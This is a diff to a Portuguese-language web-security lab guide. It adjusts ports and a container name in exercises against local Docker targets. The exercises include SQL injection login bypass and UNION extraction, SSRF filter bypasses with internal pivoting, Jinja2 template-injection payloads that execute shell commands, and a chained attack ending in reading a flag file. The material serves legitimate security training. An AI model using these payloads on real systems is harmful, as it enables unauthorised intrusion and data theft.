@@ -82,7 +82,7 @@ curl -s http://127.0.0.1:13373/healthz            # GraphQL API
 curl -s http://127.0.0.1:13374/                   # HAProxy front (smuggle)
 
 # Entrar no atacante:
-docker exec -it attacker bash
+docker exec -it attacker-web bash
 ```
 
 > 💡 Todo tráfego do atacante passa pela `webnet`; nenhuma porta vulnerável é exposta para a Internet do host (só para `127.0.0.1`), evitando que sua máquina vire alvo real.
@@ -94,16 +94,16 @@ docker exec -it attacker bash
 ### Exercício 2.2.1 — Recon de superfície de ataque
 
 ```bash
-docker exec -it attacker bash
+docker exec -it attacker-web bash
 
 # Descoberta de diretórios em alta velocidade:
-ffuf -u http://172.40.0.20/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302 -t 100
+ffuf -u http://172.40.0.20:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302 -t 100
 
 # Descoberta de subdomínios virtuais (Host header):
-ffuf -u http://172.40.0.20/ -H "Host: FUZZ.acme.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 6850
+ffuf -u http://172.40.0.20:3000/ -H "Host: FUZZ.acme.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 6850
 
 # Extração de endpoints do bundle JS (Juice Shop SPA):
-curl -s http://172.40.0.20/main.js | grep -oE '"/api/[^"]+"' | sort -u
+curl -s http://172.40.0.20:3000/main.js | grep -oE '"/api/[^"]+"' | sort -u
 ```
 
 > 🎓 **Truque:** o `-fs` (filter size) elimina respostas com o tamanho exato do "404 padrão". Sempre rode primeiro um request com chave inexistente e meça o tamanho.
@@ -114,7 +114,7 @@ Juice Shop tem uma página de login clássica em `/#/login`. Capture o request c
 
 ```bash
 # Bypass de autenticação via SQLi clássico:
-curl -s -X POST http://172.40.0.20/rest/user/login \
+curl -s -X POST http://172.40.0.20:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"' OR 1=1--","password":"x"}'
 # Resposta inclui token JWT de admin
@@ -124,7 +124,7 @@ Para extração de dados via UNION-based:
 
 ```bash
 # Endpoint vulnerável de busca:
-curl -s "http://172.40.0.20/rest/products/search?q=')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--"
+curl -s "http://172.40.0.20:3000/rest/products/search?q=')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--"
 ```
 
 > 🎯 Ferramenta automatizada quando manual não compensa: `sqlmap -u "..." --level 5 --risk 3 --random-agent --tamper=between,space2comment`.
@@ -135,16 +135,16 @@ A `ssti-app` tem um endpoint `/fetch?url=` que tenta filtrar `127.0.0.1`/`localh
 
 ```bash
 # 1) IP em decimal (127.0.0.1 = 2130706433):
-curl "http://172.40.0.30/fetch?url=http://2130706433/internal/admin"
+curl "http://172.40.0.30:5000/fetch?url=http://2130706433/internal/admin"
 
 # 2) IPv6 mapped:
-curl "http://172.40.0.30/fetch?url=http://[::ffff:7f00:1]/internal/admin"
+curl "http://172.40.0.30:5000/fetch?url=http://[::ffff:7f00:1]/internal/admin"
 
 # 3) DNS rebinding via host externo (em pentest real). Para o lab basta:
-curl "http://172.40.0.30/fetch?url=http://0.0.0.0/internal/admin"
+curl "http://172.40.0.30:5000/fetch?url=http://0.0.0.0/internal/admin"
 
 # 4) Pivoting interno (acessar GraphQL via SSRF):
-curl "http://172.40.0.30/fetch?url=http://172.40.0.40:4000/graphql?query=%7B__typename%7D"
+curl "http://172.40.0.30:5000/fetch?url=http://172.40.0.40:4000/graphql?query=%7B__typename%7D"
 ```
 
 ### Exercício 2.2.4 — SSTI em Jinja2 → RCE
@@ -153,17 +153,17 @@ A `ssti-app` renderiza o parâmetro `name` direto no template. Caminho clássico
 
 ```bash
 # 1) Detecção inocente:
-curl "http://172.40.0.30/hello?name=\{\{7*7\}\}"
+curl "http://172.40.0.30:5000/hello?name=\{\{7*7\}\}"
 # Se retornar "Hello 49" → Jinja2 confirmado.
 
 # 2) Sondagem de classes:
-curl --data-urlencode "name={{ ''.__class__.__mro__[1].__subclasses__() }}" "http://172.40.0.30/hello"
+curl --data-urlencode "name={{ ''.__class__.__mro__[1].__subclasses__() }}" "http://172.40.0.30:5000/hello"
 
 # 3) RCE — payload curto que funciona em Jinja2 moderno:
-curl -G --data-urlencode "name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}" "http://172.40.0.30/hello"
+curl -G --data-urlencode "name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}" "http://172.40.0.30:5000/hello"
 
 # 4) Versão cyclic-import-safe (em alguns Flask):
-curl -G --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}" "http://172.40.0.30/hello"
+curl -G --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}" "http://172.40.0.30:5000/hello"
 ```
 
 ### Exercício 2.2.5 — Atacando JWT no GraphQL API
@@ -285,7 +285,7 @@ while true; do curl -s http://172.40.0.50/ > /dev/null; done
 [attacker]
    │  (1) SQLi login → admin token Juice Shop
    │  (2) Crack JWT GraphQL (HS256/secret) → forge admin
-   │  (3) Endpoint do GraphQL com SSRF (proxyFetch) → http://172.40.0.30/fetch
+   │  (3) Endpoint do GraphQL com SSRF (proxyFetch) → http://172.40.0.30:5000/fetch
    │  (4) SSRF aninhado: /fetch?url=http://localhost/hello?name={{...SSTI...}}
    │  (5) RCE via Jinja2 → cat /flag.txt
    ▼
@@ -295,7 +295,7 @@ flag{web_chain_owns_full_stack}
 ### Passo 1 — Admin no Juice Shop
 
 ```bash
-curl -s -X POST http://172.40.0.20/rest/user/login \
+curl -s -X POST http://172.40.0.20:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d "{\"email\":\"' OR 1=1 ORDER BY id--\",\"password\":\"x\"}" | jq .
 ```
@@ -323,7 +323,7 @@ A `graphql-api` expõe a mutation `proxyFetch(url: String!)` (acessível só a a
 curl -s -X POST http://172.40.0.40:4000/graphql \
   -H "Authorization: Bearer $ADMIN" \
   -H "Content-Type: application/json" \
-  -d '{"query":"mutation{proxyFetch(url:\"http://172.40.0.30/hello?name={{cycler.__init__.__globals__.os.popen(%27cat /flag.txt%27).read()}}\")}"}'
+  -d '{"query":"mutation{proxyFetch(url:\"http://172.40.0.30:5000/hello?name={{cycler.__init__.__globals__.os.popen(%27cat /flag.txt%27).read()}}\")}"}'
 ```
 
 A resposta retorna o conteúdo do `/flag.txt` renderizado pelo template Jinja2 da `ssti-app`.
